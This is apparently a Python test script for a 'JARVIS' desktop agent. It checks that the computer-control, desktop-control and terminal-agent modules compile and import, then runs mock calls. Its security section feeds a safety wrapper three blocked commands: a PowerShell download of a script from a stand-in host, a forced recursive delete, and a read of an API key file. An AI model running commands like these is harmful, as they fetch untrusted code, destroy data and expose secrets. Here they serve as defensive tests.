import sys
import os
import asyncio
from pathlib import Path

sys.path.insert(0, '.')

print("=== VERIFICACION DE ACCIONES (BLOQUE 2) ===")

# 1. Syntax Check
print("\n--- 1. Check de Sintaxis ---")
files_to_check = [
    "actions/computer_control.py",
    "actions/desktop_control.py",
    "actions/terminal_agent.py"
]
for filename in files_to_check:
    try:
        with open(filename, "r", encoding="utf-8") as f:
            compile(f.read(), filename, "exec")
        print(f"  [OK] Sintaxis de '{filename}' es valida.")
    except Exception as e:
        print(f"  [FAIL] Error de sintaxis en '{filename}': {e}")

# 2. Import Check
print("\n--- 2. Check de Importacion ---")
try:
    from actions.computer_control import computer_control
    print("  [OK] computer_control importado.")
except Exception as e:
    print(f"  [FAIL] Import computer_control: {e}")

try:
    from actions.desktop_control import desktop_control
    print("  [OK] desktop_control importado.")
except Exception as e:
    print(f"  [FAIL] Import desktop_control: {e}")

try:
    from actions.terminal_agent import terminal_agent
    print("  [OK] terminal_agent importado.")
except Exception as e:
    print(f"  [FAIL] Import terminal_agent: {e}")

# 3. Execution Verification
print("\n--- 3. Pruebas de Ejecucion Mock (computer_control) ---")
try:
    # Wait action
    r_wait = computer_control({"action": "wait", "seconds": 0.5})
    print(f"  [computer_control - Wait] {r_wait}")
    
    # Coordinates limits check (out of bounds)
    r_bounds = computer_control({"action": "click", "x": 99999, "y": 99999})
    print(f"  [computer_control - Bounds Protection] {r_bounds}")
except Exception as e:
    print(f"  [computer_control] FAIL: {e}")

print("\n--- 4. Pruebas de Ejecucion Mock (desktop_control) ---")
try:
    # Desktop stats
    r_stats = desktop_control({"action": "stats"})
    print(f"  [desktop_control - Stats] {r_stats.splitlines()[0]}")
    
    # Auto find task file
    r_find = desktop_control({"action": "task", "search_name": "_test_new_actions", "search_path": "home"})
    print(f"  [desktop_control - Search Shortcut] {r_find}")
except Exception as e:
    print(f"  [desktop_control] FAIL: {e}")

print("\n--- 5. Pruebas de Ejecucion y Seguridad (terminal_agent) ---")
try:
    # Ejecucion normal (CMD / PowerShell simple)
    r_normal = terminal_agent({"command": "echo 'JARVIS Test'"})
    print(f"  [terminal_agent - Run normal] Salida: '{r_normal.strip()}'")

    # Prueba de Safe terminal wrapper (Debe bloquear descargas remotas)
    from agents.security import safe_terminal_agent
    r_blocked_download = safe_terminal_agent(terminal_agent, {"command": "Invoke-WebRequest http://dangerous.com/script.ps1"})
    print(f"  [safe_terminal_agent - Blocked Download] {r_blocked_download.strip()}")

    # Prueba de Safe terminal wrapper (Debe bloquear borrados destructivos)
    r_blocked_del = safe_terminal_agent(terminal_agent, {"command": "del /F /S /Q C:\\Windows\\temp"})
    print(f"  [safe_terminal_agent - Blocked Destructive] {r_blocked_del.strip()}")

    # Prueba de Safe terminal wrapper (Debe bloquear accesos a secretos)
    r_blocked_secret = safe_terminal_agent(terminal_agent, {"command": "type api_keys.json"})
    print(f"  [safe_terminal_agent - Blocked Secret] {r_blocked_secret.strip()}")
except Exception as e:
    print(f"  [terminal_agent] FAIL: {e}")

# 4. Manager Routing Check
print("\n--- 6. Test de Integracion de Manager ---")
async def test_manager_routing():
    try:
        from core.manager import AgentManager
        mgr = AgentManager()
        
        # Test routing and wrapper of terminal_agent
        res_term = await mgr.dispatch("terminal_agent", {"command": "echo 'Routing works'"}, ui=None)
        print(f"  [Manager -> terminal_agent] Ruteado: '{res_term.strip()}'")
        
        res_comp = await mgr.dispatch("computer_control", {"action": "wait", "seconds": 0.1}, ui=None)
        print(f"  [Manager -> computer_control] Ruteado: '{res_comp}'")

        res_desk = await mgr.dispatch("desktop_control", {"action": "stats"}, ui=None)
        print(f"  [Manager -> desktop_control] Ruteado: '{res_desk.splitlines()[0]}'")
    except Exception as e:
        print(f"  [Manager Routing] FAIL: {e}")

asyncio.run(test_manager_routing())
